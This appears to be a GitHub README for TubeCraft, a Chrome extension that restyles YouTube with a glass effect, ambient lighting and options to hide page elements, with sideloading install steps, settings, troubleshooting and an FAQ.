# 🎨 TubeCraft - Modern YouTube design for daily viewing

[![Download TubeCraft](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases)

TubeCraft changes how you watch videos. It adds a clean glass look to your YouTube interface. It creates a soft light effect around your video player. It also hides parts of the page that distract you. This tool works inside your Chrome browser. It makes your screen feel calm and helps you focus on content.

## 🛠️ System Requirements

You need a computer that runs Windows 10 or Windows 11. You must use the Google Chrome browser to run this extension. Ensure your Chrome browser stays up to date to keep everything running smoothly. You do not need extra software. You do not need to know how to write code.

## 📥 How to Install

Follow these steps to add TubeCraft to your browser.

1. Visit this web page to download the latest files: [https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases](https://github.com/Nonterritorial-sunvisor289/TubeCraft/releases).
2. Look for the section labeled Assets.
3. Click the link that ends in .zip to start the download.
4. Open your Downloads folder on your Windows computer.
5. Right-click the file you just downloaded.
6. Select Extract All and choose a folder where you can find it later.
7. Open Chrome and type chrome://extensions in the URL bar.
8. Press Enter on your keyboard.
9. Toggle the Developer mode switch in the top right corner of the page.
10. Click the button labeled Load unpacked.
11. Select the folder where you extracted the TubeCraft files.
12. Click Select Folder.

TubeCraft now appears in your list of extensions. You see a new icon in your browser toolbar.

## ✨ Using TubeCraft

Once installed, TubeCraft starts to work when you open YouTube. The interface now features a translucent glass look. You see the background shine through the page elements.

The ambient lighting effect adds a subtle glow behind your video player. The colors of the glow change to match the colors in the video. This creates an immersive theater effect.

To enter distraction-free mode, click the TubeCraft icon in your browser bar. You can choose to hide the sidebar, the comments section, or the recommended video list. This allows you to focus only on the video you watch.

## ⚙️ Settings and Customization

You can change how TubeCraft behaves through the settings menu. Click the TubeCraft icon in your browser toolbar to open the menu.

- **Enable Glassmorphism:** Toggle this feature to turn the glass effect on or off.
- **Ambient Lighting:** Adjust the intensity of the light glow behind your player. You can turn this off if you prefer a static background.
- **Hide UI Elements:** Check the boxes next to the parts of the page you want to hide.
- **Language Support:** TubeCraft detects your browser language settings. It supports many languages including English, Azerbaijani, Hindi, Russian, Spanish, Thai, Turkish, Turkmen, Uyghur, and Uzbek.

## 🔍 Troubleshooting Common Issues

If you do not see the icon in your toolbar, click the puzzle piece icon in the top right of your browser. Find TubeCraft in the list and click the pin icon to keep it visible.

If the extension stops working, try to refresh your current YouTube page. If the issue persists, open the extensions page in Chrome, find TubeCraft, and click the blue refresh icon.

If the ambient lighting blocks your view, reduce the intensity setting in the TubeCraft menu. High intensity settings work best in low light rooms.

## 💡 Frequently Asked Questions

**Does TubeCraft track my history?**
No, TubeCraft does not collect or store your browsing history. Your data stays on your computer.

**Does this slow down my browser?**
TubeCraft uses efficient code to ensure your browser remains fast. It only runs when you visit YouTube.

**Can I use this with other YouTube extensions?**
TubeCraft works with most other extensions. If you experience conflicts, turn off other YouTube-related tools to see if the interface improves.

**Do I need an account to use this?**
No, you do not need to register or sign in to use these features.

**How do I uninstall the extension?**
Open the extensions page in Chrome. Find TubeCraft in the list. Click the Remove button to delete the extension from your browser.
